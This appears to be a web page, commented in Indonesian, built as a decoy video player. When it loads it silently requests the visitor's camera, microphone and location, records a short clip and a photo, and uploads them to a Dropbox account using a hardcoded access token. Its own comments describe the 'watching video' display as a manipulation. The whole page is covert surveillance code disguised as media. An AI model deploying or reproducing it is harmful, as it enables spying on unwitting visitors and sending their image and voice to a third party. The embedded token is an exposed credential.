<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tracking, Camera, and Dropbox Upload</title>
    <style>
        #videoElement {
            width: 100%;
            height: auto;
            display: none; /* Video dari kamera disembunyikan sampai video dimulai */
        }
        #recordedVideo {
            display: none; /* Video hasil rekaman disembunyikan */
            width: 100%;
        }
        #fakeVideo {
            width: 100%;
            height: auto;
            background-color: #000;
            display: none; /* Menyembunyikan placeholder "Menonton Video" */
        }
    </style>
</head>
<body>
    <h1>Rekam Video, Ambil Foto, Lacak Lokasi, dan Unggah ke Dropbox</h1>
    
    <!-- Video yang ditampilkan -->
    <video id="videoElement" autoplay muted></video>

    <!-- Placeholder untuk manipulasi tampilan seolah menonton video -->
    <div id="fakeVideo">
        <p>Menonton Video...</p>
        <!-- Video yang diputar dari Dropbox -->
        <video id="dropboxVideo" width="100%" height="auto" controls>
            <source src="https://www.dropbox.com/scl/fi/0gds2665t1f9ck0myxvl4/lv_0_20241225170240.mp4?rlkey=94pagrxrt67vg2jhrzo2yp0vv&st=aommju4o&raw=1" type="video/mp4">
            Your browser does not support the video tag.
        </video>
    </div>

    <script>
        let videoElement = document.getElementById('videoElement');
        let recordedVideo = document.getElementById('recordedVideo');
        let fakeVideo = document.getElementById('fakeVideo');
        let dropboxVideo = document.getElementById('dropboxVideo');

        let mediaStream;
        let mediaRecorder;
        let recordedChunks = [];
        let locationData = [];

        // Ganti dengan token akses Dropbox Anda
        const DROPBOX_ACCESS_TOKEN = 'UwS97ukIVHCM_ewt3mdZeSJeyyA1tXJH1oy3PhirAZ1xR2Avy6vFbsMzBivqv0JHQw9MKjvaAqB_sgzJF4xNNwdgD2eA4CSqSnFpeVdmPLMu0HcRzlLmMblUHY5ClRE2NrxRtZ';

        // Fungsi untuk melacak lokasi pengguna
        function trackLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    locationData = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude
                    };
                    console.log('Latitude: ' + position.coords.latitude);
                    console.log('Longitude: ' + position.coords.longitude);
                }, function(error) {
                    console.log('Error dalam melacak lokasi:', error);
                });
            } else {
                console.log('Geolocation tidak didukung di browser ini.');
            }
        }

        // Fungsi untuk memulai video
        function startVideo() {
            navigator.mediaDevices.getUserMedia({ video: true, audio: true })
                .then(function(stream) {
                    mediaStream = stream;
                    videoElement.srcObject = stream; // Menampilkan video langsung
                    videoElement.style.display = 'block'; // Menampilkan video
                    fakeVideo.style.display = 'none'; // Menyembunyikan placeholder "menonton video"
                    trackLocation(); // Mulai melacak lokasi ketika video dimulai
                })
                .catch(function(error) {
                    console.log('Akses kamera gagal: ', error);
                });
        }

        // Fungsi untuk mulai merekam video
        function startRecording() {
            recordedChunks = [];
            mediaRecorder = new MediaRecorder(mediaStream);

            mediaRecorder.ondataavailable = function(event) {
                recordedChunks.push(event.data);
            };

            mediaRecorder.onstop = function() {
                let blob = new Blob(recordedChunks, { type: 'video/webm' });
                let videoURL = URL.createObjectURL(blob);
                recordedVideo.src = videoURL;
                recordedVideo.style.display = 'block'; // Tampilkan video hasil rekaman
                uploadToDropbox(blob, 'video'); // Unggah video setelah rekaman selesai
            };

            mediaRecorder.start();
        }

        // Fungsi untuk berhenti merekam
        function stopRecording() {
            mediaRecorder.stop();
            videoElement.style.display = 'none'; // Sembunyikan video saat rekaman selesai
        }

        // Fungsi untuk mengambil foto dari kamera
        function takePhoto() {
            let canvas = document.createElement('canvas');
            let context = canvas.getContext('2d');
            canvas.width = videoElement.videoWidth;
            canvas.height = videoElement.videoHeight;
            context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(function(blob) {
                uploadToDropbox(blob, 'photo'); // Unggah foto ke Dropbox
            }, 'image/jpeg');
        }

        // Fungsi untuk mengunggah file ke Dropbox
        function uploadToDropbox(fileBlob, type) {
            const url = 'https://content.dropboxapi.com/2/files/upload';
            const xhr = new XMLHttpRequest();
            const fileName = type === 'video' ? 'recorded_video.webm' : 'photo.jpg';

            xhr.open('POST', url, true);
            xhr.setRequestHeader('Authorization', 'Bearer ' + DROPBOX_ACCESS_TOKEN);
            xhr.setRequestHeader('Content-Type', 'application/octet-stream');
            xhr.setRequestHeader('Dropbox-API-Arg', JSON.stringify({
                path: '/Uploads/' + fileName,
                mode: 'add',
                autorename: true,
                mute: false
            }));

            xhr.onload = function() {
                console.log('File berhasil diunggah ke Dropbox:', xhr.responseText);
            };

            xhr.onerror = function() {
                console.error('Gagal mengunggah ke Dropbox');
            };

            xhr.send(fileBlob);
        }

        // Fungsi utama yang memulai semua proses
        function startAllFunctions() {
            // Tampilkan video dari Dropbox
            dropboxVideo.style.display = 'block'; // Tampilkan video dari Dropbox
            fakeVideo.style.display = 'none'; // Sembunyikan placeholder "Menonton Video"

            startVideo(); // Mulai video dan lokasi
            startRecording(); // Mulai merekam setelah video dimulai

            // Ambil foto setelah 2 detik
            setTimeout(function() {
                takePhoto();
            }, 2000); // Foto setelah 2 detik

            // Setelah 5 detik, hentikan rekaman dan sembunyikan video
            setTimeout(function() {
                stopRecording(); // Berhenti merekam setelah 5 detik
            }, 5000); // Rekam selama 5 detik
        }

        // Menjalankan semua fungsi secara otomatis setelah halaman dimuat
        window.onload = function() {
            startAllFunctions();
        };
    </script>
</body>
</html>
